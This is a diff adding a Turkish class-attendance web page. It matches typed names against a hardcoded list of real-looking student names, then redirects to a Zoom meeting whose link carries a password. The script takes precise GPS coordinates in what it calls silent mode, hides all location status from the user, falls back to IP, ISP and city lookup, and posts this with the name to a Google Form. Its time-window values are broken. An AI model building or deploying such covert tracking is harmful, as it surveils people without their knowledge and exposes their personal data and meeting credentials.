@@ -1,0 +1,143 @@
+﻿<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title></title>
+    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { background-color: #f0f2f5; font-family: 'Segoe UI', Roboto, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        .card { background: white; padding: 40px; width: 100%; max-width: 500px; text-align: center; border-radius: 20px; box-shadow: 0 15px 50px rgba(0,0,0,0.15); transition: all 0.3s ease; transform: scale(1.2); }
+        .logo { max-width: 220px; margin: 0 auto 25px auto; display: block; }
+        h3 { color: #1a1a1a; font-weight: 800; font-size: 26px; margin-bottom: 10px; text-transform: uppercase; }
+        p { color: #65676b; font-size: 16px; margin-bottom: 30px; }
+        input { width: 100%; padding: 18px; margin-bottom: 20px; background: #f0f2f5; border: 2px solid #dddfe2; border-radius: 12px; text-align: center; font-size: 18px; font-weight: bold; color: #1c1e21; transition: 0.3s; }
+        input:focus { border-color: #1877f2; outline: none; background: white; }
+        button { width: 100%; padding: 20px; background: #e4e6eb; color: #bcc0c4; border: none; border-radius: 12px; font-size: 18px; font-weight: bold; cursor: not-allowed; transition: 0.3s; }
+        button.active { background: #1877f2; color: white; cursor: pointer; box-shadow: 0 5px 20px rgba(24, 119, 242, 0.4); }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #1877f2; border-radius: 50%; width: 35px; height: 35px; animation: spin 1s linear infinite; display: none; margin: 0 auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        #success-view { display: none; opacity: 0; transition: opacity 0.5s ease; text-align: center; }
+        .tick-img { width: 100px; height: 100px; margin: 0 auto 20px auto; display: block; animation: popIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
+        .final-msg { color: #2ecc71; font-size: 28px; font-weight: 900; letter-spacing: 1px; text-transform: uppercase; margin-top: 15px; }
+        .sub-msg { color: #666; font-size: 16px; margin-top: 5px; font-weight: 600; }
+        @keyframes popIn { 0% { transform: scale(0); } 100% { transform: scale(1); } }
+        .hidden { display: none !important; }
+        /* GİZLİLİK: Konum mesajı asla görünmez */
+        .gps-status { display: none !important; } 
+        @media screen and (max-width: 600px) {
+            body { background-color: white; }
+            .card { transform: scale(1); height: 100vh; max-width: 100%; border-radius: 0; box-shadow: none; display: flex; flex-direction: column; justify-content: center; padding: 20px; }
+            input, button { padding: 22px; font-size: 20px; }
+        }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <img src="https://cdn.prod.website-files.com/68b41d250349c9a385b11ecc/68b42031492c916cc2c20789_nep_logo%201.png" alt="NEP Logo" class="logo">
+        <div id="form-view">
+            <h3></h3>
+            <p>Sisteme kayıt olduğunuz gibi yazın.</p>
+            <input type="text" id="name" placeholder="AD SOYAD" onkeyup="checkLogic()" autocomplete="off">
+            <button id="btn" onclick="processEntry()" disabled>GİRİŞ YAP</button>
+            <div class="loader" id="loader"></div>
+            <div id="gps-msg" class="gps-status"></div> 
+        </div>
+        <div id="success-view">
+            <img src="https://cdn-icons-png.flaticon.com/512/148/148767.png" class="tick-img" alt="Başarılı">
+            <div class="final-msg">KAYIT ALINDI</div>
+            <div class="sub-msg">Derse yönlendiriliyorsunuz...</div>
+        </div>
+    </div>
+    <script>
+        const FORM_URL = "https://docs.google.com/forms/d/e/1FAIpQLScfbB_2Bosvt03ugFP6CUfq-tEp-5UpAkoj5Psz40krEVdspQ/formResponse";
+        const ENTRY_NAME = "entry.1545633020";
+        const ENTRY_LOC = "entry.1443001544";
+        const PATRON = "MUHAMMED SAID"; 
+        const TARGET_LINK = "https://us05web.zoom.us/j/7599628531?pwd=TkR0ZWlDN1FVUDdTd0l0MEY4ODFBZz09";
+        const ALLOWED_NAMES = [
+            "MUHAMMED SAID", "BÜNYAMİN ÇAĞRI AKBOYUN", "ÖMER EYMEN ÇETİNTAŞ", "MUSTAFA YUSUF ÖZBAKIR", 
+            "ENES EKİZ", "SALİH KEREM YENER", "AYBERK YUSUF AKKURT", "EYMEN ERDOĞAN KARA", 
+            "SADULLAH YAHYA ÇAVUŞOĞLU", "YUSUF AĞLAMIŞ", "AHMET AĞLAMIŞ", "HAMZA İZCİ", 
+            "ALPARSLAN ONUR ÖZEREN", "MUHAMMED YUSUF KARAKUŞ", "MUSAB METİN MUTLU", 
+            "KEREM ALİ ÇAKIR", "AHMED ARİF KARAKAPLAN"
+        ];
+        const START_TIME = new Date("T:00+03:00").getTime();
+        const END_TIME   = new Date("T:00+03:00").getTime();
+        let mapLink = "VERİ YOK"; 
+        let finalMatchedName = "";
+        const btn = document.getElementById('btn');
+        // 1. HASSAS GPS (SESSİZ MOD)
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (pos) => { mapLink = pos.coords.latitude + ", " + pos.coords.longitude; },
+                (err) => { getDeepIpIntel(); }, // Hata verirse IP dene
+                { 
+                    enableHighAccuracy: true, // EN YÜKSEK HASSASİYET
+                    timeout: 15000,           // 15 Saniye bekle (Uydu bulması için)
+                    maximumAge: 0             // ASLA eski konumu kullanma (Taze veri)
+                }
+            );
+        } else { getDeepIpIntel(); }
+        // 2. IP DERİN ANALİZ (YEDEK PLAN)
+        function getDeepIpIntel() {
+            fetch('https://ipapi.co/json/')
+                .then(res => res.json())
+                .then(data => {
+                    const geoUrl = "http://maps.google.com/?q=" + data.latitude + "," + data.longitude;
+                    mapLink = "[AĞ] " + data.ip + " | " + data.org + " | " + data.city + " | " + geoUrl;
+                })
+                .catch(err => { mapLink = "İZLENELEMEDİ"; });
+        }
+        function levenshtein(a, b) {
+            const m = []; for(let i=0;i<=b.length;i++)m[i]=[i]; for(let j=0;j<=a.length;j++)m[0][j]=j;
+            for(let i=1;i<=b.length;i++)for(let j=1;j<=a.length;j++)
+                m[i][j]=b.charAt(i-1)==a.charAt(j-1)?m[i-1][j-1]:Math.min(m[i-1][j-1]+1,Math.min(m[i-1][j-1]+1,m[i-1][j]+1));
+            return m[b.length][a.length];
+        }
+        function checkLogic() {
+            const inputVal = document.getElementById('name').value.trim().toLocaleUpperCase('tr-TR');
+            if (inputVal.length < 3) return;
+            let matchedName = null;
+            for (let i = 0; i < ALLOWED_NAMES.length; i++) {
+                if (levenshtein(inputVal, ALLOWED_NAMES[i]) <= (ALLOWED_NAMES[i].length>6?2:1)) { matchedName = ALLOWED_NAMES[i]; break; }
+            }
+            if (matchedName) {
+                finalMatchedName = matchedName;
+                btn.disabled = false; btn.className = "active";
+            } else { btn.disabled = true; btn.className = ""; }
+        }
+        function processEntry() {
+            const now = new Date().getTime();
+            if (finalMatchedName !== PATRON) {
+                if (now < START_TIME) { alert("Yoklama saati henüz gelmedi!"); return; }
+                if (now > END_TIME) { alert("Yoklama süresi doldu!"); return; }
+            }
+            const isException = (finalMatchedName === PATRON || finalMatchedName.includes("AHMET") || finalMatchedName.includes("YUSUF") || finalMatchedName.includes("AĞLAMIŞ"));
+            const deviceKey = "nep_lock_" + ""; 
+            if (!isException && localStorage.getItem(deviceKey)) { alert("⛔ BU CİHAZDAN ZATEN GİRİŞ YAPILDI!"); return; }
+            btn.style.display = "none";
+            document.getElementById('name').style.display = "none";
+            document.getElementById('loader').style.display = "block";
+            const formData = new FormData();
+            formData.append(ENTRY_NAME, finalMatchedName);
+            formData.append(ENTRY_LOC, mapLink);
+            fetch(FORM_URL, { method: "POST", mode: "no-cors", body: formData })
+            .then(() => {
+                if (!isException) localStorage.setItem(deviceKey, "locked");
+                if (navigator.vibrate) navigator.vibrate([100, 50, 100]);
+                confetti({ particleCount: 200, spread: 100, origin: { y: 0.6 } });
+                document.getElementById('loader').style.display = "none";
+                document.getElementById('form-view').classList.add("hidden");
+                const successView = document.getElementById('success-view');
+                successView.style.display = "block";
+                setTimeout(() => { successView.style.opacity = "1"; }, 50);
+                if (TARGET_LINK && TARGET_LINK.length > 4) {
+                    setTimeout(() => { window.location.href = TARGET_LINK; }, 3000);
+                }
+            }).catch(err => { alert("Hata oluştu."); btn.style.display = "block"; });
+        }
+    </script>
+</body>
+</html>
